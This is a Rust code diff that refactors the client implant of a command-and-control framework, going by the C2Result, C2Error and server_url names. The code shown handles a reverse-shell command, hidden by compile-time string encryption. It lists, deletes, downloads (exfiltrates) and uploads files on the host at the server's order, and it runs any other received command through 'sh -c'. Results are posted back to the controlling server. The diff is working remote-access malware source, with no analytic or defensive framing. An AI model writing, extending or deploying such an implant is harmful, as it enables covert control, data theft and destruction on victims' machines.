@@ -1,5 +1,5 @@
 use cryptify::encrypt_string;
-use log::info;
+use log::{error, info};
 use reqwest::Client;
 use std::path::PathBuf;
 use std::process::Stdio;
@@ -15,6 +15,7 @@ use common::message::{
     DeletePathResponse,
     DownloadFileRequest,
     FileChunk,
+    FileOperationCommand,
     ListDirRequest,
     ListDirResponse,
     Message,
@@ -30,12 +31,12 @@ pub async fn execute_command(
     cmd: CommandRequest,
     file_manager: &ClientFileManager,
 ) -> C2Result<()> {
-    info!("Executing command: {}", cmd.command); // Changed println to info!
+    info!("Executing command: {}", cmd.command);
 
+    // Handle reverse shell command first
     if cmd.command == encrypt_string!("REVERSE_SHELL") {
         if let Some(session_id) = cmd.args.first() {
-            return start_reverse_shell(http_client, server_url, session_id.clone().to_string())
-                .await;
+            return start_reverse_shell(http_client, server_url, session_id.clone()).await;
         } else {
             return Err(C2Error::Other(
                 "Reverse shell command missing session_id".into(),
@@ -43,145 +44,218 @@ pub async fn execute_command(
         }
     }
 
+    // Try to parse as FileOperationCommand first
+    if cmd.args.len() >= 1 {
+        if let Ok(file_op_cmd) =
+            serde_json::from_slice::<FileOperationCommand>(&cmd.args[0].as_bytes())
+        {
+            match file_op_cmd {
+                FileOperationCommand::ListDir(req) => {
+                    info!("Listing directory: {}", req.path);
+                    let result =
+                        ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive)
+                            .await;
+                    info!("Directory listing result: {:?}", result);
+
+                    let response = match result {
+                        Ok(entries) => {
+                            info!("Found {} entries in directory {}", entries.len(), req.path);
+                            ListDirResponse {
+                                entries,
+                                success: true,
+                                message: "Directory listed successfully.".to_string(),
+                            }
+                        }
+                        Err(e) => {
+                            error!("Failed to list directory {}: {}", req.path, e);
+                            ListDirResponse {
+                                entries: Vec::new(),
+                                success: false,
+                                message: format!("Failed to list directory: {}", e),
+                            }
+                        }
+                    };
+
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        serde_json::to_vec(&response)?,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+                FileOperationCommand::DeletePath(req) => {
+                    let result = ClientFileManager::delete_path(&PathBuf::from(req.path)).await;
+                    let response = match result {
+                        Ok(_) => DeletePathResponse {
+                            success: true,
+                            message: "Path deleted successfully.".to_string(),
+                        },
+                        Err(e) => DeletePathResponse {
+                            success: false,
+                            message: format!("Failed to delete path: {}", e),
+                        },
+                    };
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        serde_json::to_vec(&response)?,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+                FileOperationCommand::DownloadInit(req) => {
+                    // Download initiation request
+                    let result = file_manager
+                        .initiate_download(&PathBuf::from(req.path))
+                        .await;
+                    let response_payload = match result {
+                        Ok(file_id) => serde_json::to_vec(
+                            &serde_json::json!({"file_id": file_id, "success": true, "message": "Download initiated."}),
+                        )?,
+                        Err(e) => serde_json::to_vec(
+                            &serde_json::json!({"success": false, "message": format!("Failed to initiate download: {}", e)}),
+                        )?,
+                    };
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        response_payload,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+                FileOperationCommand::DownloadChunk(req) => {
+                    // Download chunk request
+                    let result = file_manager.get_next_download_chunk(&req.file_id).await;
+                    let response_payload = match result {
+                        Ok(Some(chunk)) => serde_json::to_vec(&chunk)?,
+                        Ok(None) => serde_json::to_vec(
+                            &serde_json::json!({"is_last": true, "message": "Download complete."}),
+                        )?,
+                        Err(e) => serde_json::to_vec(
+                            &serde_json::json!({"success": false, "message": format!("Failed to get download chunk: {}", e)}),
+                        )?,
+                    };
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        response_payload,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+                FileOperationCommand::UploadInit(req) => {
+                    // Upload initiation
+                    let result = file_manager
+                        .initiate_upload(&PathBuf::from(req.path), &req.file_id)
+                        .await;
+                    let response_payload = match result {
+                        Ok(_) => serde_json::to_vec(
+                            &serde_json::json!({"success": true, "message": "Upload initiated."}),
+                        )?,
+                        Err(e) => serde_json::to_vec(
+                            &serde_json::json!({"success": false, "message": format!("Failed to initiate upload: {}", e)}),
+                        )?,
+                    };
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        response_payload,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+                FileOperationCommand::UploadChunk(chunk) => {
+                    // Chunk upload
+                    let result = file_manager
+                        .write_file_chunk(&chunk.file_id.clone(), chunk)
+                        .await;
+                    let response_payload = match result {
+                        Ok(_) => serde_json::to_vec(
+                            &serde_json::json!({"success": true, "message": "Chunk uploaded."}),
+                        )?,
+                        Err(e) => serde_json::to_vec(
+                            &serde_json::json!({"success": false, "message": format!("Failed to upload chunk: {}", e)}),
+                        )?,
+                    };
+                    send_file_operation_response(
+                        http_client,
+                        server_url,
+                        client_id,
+                        cmd.message_id
+                            .clone()
+                            .unwrap_or_else(|| "unknown".to_string()),
+                        response_payload,
+                    )
+                    .await?;
+                    return Ok(());
+                }
+            }
+        }
+    }
+
+    // Only keep ListDir for backward compatibility, remove other duplicated operations
     match cmd.command.as_str() {
-        "LIST_DIR" => {
+        "ListDir" => {
+            // Keep this for backward compatibility only
             let req: ListDirRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
+            info!("Listing directory: {}", req.path);
             let result =
-                ClientFileManager::list_directory(&PathBuf::from(req.path), req.recursive).await;
+                ClientFileManager::list_directory(&PathBuf::from(&req.path), req.recursive).await;
+
             let response = match result {
-                Ok(entries) => ListDirResponse {
-                    entries,
-                    success: true,
-                    message: "Directory listed successfully.".to_string(),
-                },
-                Err(e) => ListDirResponse {
-                    entries: Vec::new(),
-                    success: false,
-                    message: format!("Failed to list directory: {}", e),
-                },
+                Ok(entries) => {
+                    info!("Found {} entries in directory {}", entries.len(), req.path);
+                    ListDirResponse {
+                        entries,
+                        success: true,
+                        message: "Directory listed successfully.".to_string(),
+                    }
+                }
+                Err(e) => {
+                    error!("Failed to list directory {}: {}", req.path, e);
+                    ListDirResponse {
+                        entries: Vec::new(),
+                        success: false,
+                        message: format!("Failed to list directory: {}", e),
+                    }
+                }
             };
+
             send_file_operation_response(
                 http_client,
                 server_url,
                 client_id,
-                MessageType::ListDir,
+                cmd.message_id
+                    .clone()
+                    .unwrap_or_else(|| "unknown".to_string()),
                 serde_json::to_vec(&response)?,
-            )
-            .await?;
-        }
-        "DELETE_PATH" => {
-            let req: DeletePathRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
-            let result = ClientFileManager::delete_path(&PathBuf::from(req.path)).await;
-            let response = match result {
-                Ok(_) => DeletePathResponse {
-                    success: true,
-                    message: "Path deleted successfully.".to_string(),
-                },
-                Err(e) => DeletePathResponse {
-                    success: false,
-                    message: format!("Failed to delete path: {}", e),
-                },
-            };
-            send_file_operation_response(
-                http_client,
-                server_url,
-                client_id,
-                MessageType::DeletePath,
-                serde_json::to_vec(&response)?,
-            )
-            .await?;
-        }
-        "DOWNLOAD_FILE_INIT" => {
-            let req: DownloadFileRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
-            let result = file_manager
-                .initiate_download(&PathBuf::from(req.path))
-                .await;
-            let response_payload = match result {
-                Ok(file_id) => serde_json::to_vec(
-                    &serde_json::json!({"file_id": file_id, "success": true, "message": "Download initiated."}),
-                )?,
-                Err(e) => serde_json::to_vec(
-                    &serde_json::json!({"success": false, "message": format!("Failed to initiate download: {}", e)}),
-                )?,
-            };
-            send_file_operation_response(
-                http_client,
-                server_url,
-                client_id,
-                MessageType::DownloadFile,
-                response_payload,
-            )
-            .await?;
-        }
-        "DOWNLOAD_FILE_CHUNK" => {
-            let file_id = &cmd.args[0];
-            let result = file_manager.get_next_download_chunk(file_id).await;
-            let response_payload = match result {
-                Ok(Some(chunk)) => serde_json::to_vec(&chunk)?,
-                Ok(None) => serde_json::to_vec(
-                    &serde_json::json!({"is_last": true, "message": "Download complete."}),
-                )?,
-                Err(e) => serde_json::to_vec(
-                    &serde_json::json!({"success": false, "message": format!("Failed to get download chunk: {}", e)}),
-                )?,
-            };
-            send_file_operation_response(
-                http_client,
-                server_url,
-                client_id,
-                MessageType::DownloadFile,
-                response_payload,
-            )
-            .await?;
-        }
-        "UPLOAD_FILE_INIT" => {
-            // New: Handle upload initiation
-            let req: UploadFileRequest = serde_json::from_slice(&cmd.args[0].as_bytes())?;
-            let result = file_manager
-                .initiate_upload(&PathBuf::from(req.path), &req.file_id)
-                .await;
-            let response_payload = match result {
-                Ok(_) => serde_json::to_vec(
-                    &serde_json::json!({"success": true, "message": "Upload initiated."}),
-                )?,
-                Err(e) => serde_json::to_vec(
-                    &serde_json::json!({"success": false, "message": format!("Failed to initiate upload: {}", e)}),
-                )?,
-            };
-            send_file_operation_response(
-                http_client,
-                server_url,
-                client_id,
-                MessageType::UploadFile,
-                response_payload,
-            )
-            .await?;
-        }
-        "UPLOAD_FILE_CHUNK" => {
-            // Modified: Handle subsequent chunks
-            let chunk: FileChunk = serde_json::from_slice(&cmd.args[0].as_bytes())?;
-            let result = file_manager
-                .write_file_chunk(&chunk.file_id.clone(), chunk)
-                .await; // Clone file_id
-            let response_payload = match result {
-                Ok(_) => serde_json::to_vec(
-                    &serde_json::json!({"success": true, "message": "Chunk uploaded."}),
-                )?,
-                Err(e) => serde_json::to_vec(
-                    &serde_json::json!({"success": false, "message": format!("Failed to upload chunk: {}", e)}),
-                )?,
-            };
-            send_file_operation_response(
-                http_client,
-                server_url,
-                client_id,
-                MessageType::UploadFile,
-                response_payload,
             )
             .await?;
         }
         _ => {
-            // Original command execution logic
+            // Original command execution logic for non-file operations
             let output = Command::new("sh")
                 .arg("-c")
                 .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
@@ -223,16 +297,18 @@ async fn send_file_operation_response(
     http_client: &Client,
     server_url: &str,
     client_id: &str,
-    original_message_type: MessageType,
+    message_id: String,
     payload: Vec<u8>,
 ) -> C2Result<()> {
     info!(
-        "Sending file operation response for client {} with type {:?}",
-        client_id, original_message_type
+        "Sending file operation response for client {} with payload size: {}",
+        client_id,
+        payload.len()
     );
-    let message = Message::new(MessageType::FileOperationResponse, payload);
+    let mut message = Message::new(MessageType::FileOperationResponse, payload);
+    message.id = message_id; // Use the original request message ID
 
-    http_client
+    let response = http_client
         .post(format!(
             "{server_url}/api/file_operation_response/{}",
             client_id
@@ -240,6 +316,22 @@ async fn send_file_operation_response(
         .json(&message)
         .send()
         .await?;
+
+    if !response.status().is_success() {
+        error!(
+            "Failed to send file operation response: {}",
+            response.status()
+        );
+        return Err(C2Error::Network(format!(
+            "HTTP error: {}",
+            response.status()
+        )));
+    }
+
+    info!(
+        "Successfully sent file operation response for client {}",
+        client_id
+    );
     Ok(())
 }
 
